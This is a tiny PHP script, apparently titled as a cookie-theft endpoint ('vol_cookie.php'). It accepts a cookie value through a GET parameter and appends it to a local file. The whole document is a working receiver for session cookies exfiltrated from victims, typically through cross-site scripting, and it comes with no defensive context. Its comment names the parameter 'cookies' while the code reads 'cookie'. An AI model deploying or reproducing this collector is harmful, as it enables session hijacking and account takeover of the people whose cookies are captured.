<?php
// vol_cookie.php?cookies=abc
file_put_contents('cookies.txt', $_GET['cookie']."\n", FILE_APPEND);